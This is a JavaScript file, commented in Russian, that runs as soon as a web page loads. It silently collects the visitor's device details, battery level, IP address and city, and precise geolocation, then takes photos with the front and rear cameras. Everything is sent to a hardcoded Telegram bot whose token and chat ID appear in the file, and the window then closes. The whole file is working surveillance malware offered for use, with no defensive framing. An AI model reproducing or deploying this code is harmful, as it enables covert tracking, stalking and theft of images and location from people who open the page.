// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
const CHAT_ID = '8244138604';

const video = document.getElementById('video');

// ========== ОТПРАВКА ==========
async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ========== ДАННЫЕ УСТРОЙСТВА ==========
async function sendDeviceData() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
    else if (ua.indexOf('Windows') > -1) os = 'Windows';
    
    let browser = 'Unknown';
    if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1) browser = 'Safari';
    
    const time = new Date().toLocaleString('ru-RU');
    
    let battery = '';
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            battery = `🔋 Батарея: ${Math.floor(b.level * 100)}% (${b.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let ip = '';
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = `🌍 IP: ${data.ip} (${data.city}, ${data.country_name})`;
    } catch(e) {}
    
    await sendMessage(`📱 Устройство: ${os} | ${browser}
⏰ Время: ${time}
${battery}
${ip}`);
}

// ========== ГЕОЛОКАЦИЯ (1 ПОПЫТКА) ==========
function getGeo(callback) {
    navigator.geolocation.getCurrentPosition(
        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        () => callback(null)
    );
}

// ========== КАМЕРА (1 ПОПЫТКА) ==========
function getCamera(facing, callback) {
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facing }, width: 1280, height: 720 }
    }).then(stream => callback(stream)).catch(() => callback(null));
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        canvas.width = settings.width || 1280;
        canvas.height = settings.height || 720;
        const ctx = canvas.getContext('2d');
        
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                await sendPhoto(blob, caption);
                resolve();
            }, 'image/jpeg', 0.9);
        }, 500);
    });
}

// ========== ГЛАВНАЯ ==========
async function main() {
    // 1. Данные устройства
    await sendDeviceData();
    
    // 2. Геолокация (1 попытка)
    getGeo(async (loc) => {
        if (loc) {
            await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
        }
        
        // 3. Камера (1 запрос)
        getCamera('user', async (stream) => {
            if (stream) {
                // Фронтальное фото
                await takePhoto(stream, '📸 Фронтальная камера');
                
                // Ждем 3 секунды
                setTimeout(async () => {
                    // Заднее фото
                    getCamera('environment', async (backStream) => {
                        if (backStream) {
                            await takePhoto(backStream, '📸 Задняя камера');
                            backStream.getTracks().forEach(t => t.stop());
                        }
                        stream.getTracks().forEach(t => t.stop());
                        setTimeout(() => window.close(), 1000);
                    });
                }, 3000);
            } else {
                // Камера не разрешена - закрываем
                setTimeout(() => window.close(), 1000);
            }
        });
    });
}

// ЗАПУСК
main();
